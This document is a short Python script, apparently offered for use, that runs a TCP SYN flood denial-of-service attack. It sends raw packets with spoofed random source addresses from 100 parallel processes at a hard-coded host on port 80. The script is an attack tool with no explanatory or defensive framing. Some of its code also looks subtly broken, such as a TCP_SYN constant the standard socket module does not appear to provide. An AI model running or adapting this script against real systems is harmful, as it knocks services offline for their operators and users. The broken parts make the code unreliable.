import socket
import random
import struct
from multiprocessing import Process

target_ip = "192.168.1.1"
target_port = 80
num_processes = 100
packets_per_process = 1000

def syn_flood(target_ip, target_port):
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as sock:
        for _ in range(packets_per_process):
            src_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xFFFFFFFF)))
            src_port = random.randint(1024, 65535)
            
            ip_header = struct.pack('!BBHHHBBH4s4s', 
                                    69, 0, 40, random.randint(1, 65535), 0, 255, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(src_ip), socket.inet_aton(target_ip))
            
            tcp_header = struct.pack('!HHLLBBHHH', 
                                     src_port, target_port, 0, 0, 80, socket.TCP_SYN, 8192, 0, 0)

            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, target_port))

if __name__ == "__main__":
    processes = []
    for _ in range(num_processes):
        p = Process(target=syn_flood, args=(target_ip, target_port))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
